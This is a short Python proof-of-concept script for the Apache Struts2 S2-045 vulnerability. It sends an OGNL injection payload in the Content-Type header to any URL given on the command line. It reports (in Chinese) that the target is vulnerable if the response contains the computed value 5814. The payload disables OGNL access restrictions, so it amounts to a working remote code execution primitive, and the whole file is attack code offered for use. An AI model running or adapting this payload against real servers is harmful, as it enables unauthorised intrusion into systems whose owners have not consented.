# usr/bin/env python3
#! coding:'utf-8'
# Struts2-045 Exp
# Code by Aasron

import requests
import sys
from urllib import error

print('s2-045漏洞检测脚本  '
      '#Code by Aasron'
)

def poc(url):
    payload = "%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(19*18*17)).(#ros.flush())}"
    headers = {'User-Agent':'Mozilla/5.0','Content-Type':payload}
    try:
        res = requests.get(url,headers=headers,verify=False)
        req = res.content.decode('utf-8')
        if '5814' in req:
            print("该目标存在s2-045漏洞")
        else:
            print("该目标不存在s2-045漏洞")
    except error.URLError as e:
        if hasattr(e,'code'):
            print(e.code)
        if hasattr(e,'reason'):
            print(e.reason)
if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("python3 struts2-045.py url")
        sys.exit()
    else:
        url = sys.argv[1]
        poc(url)



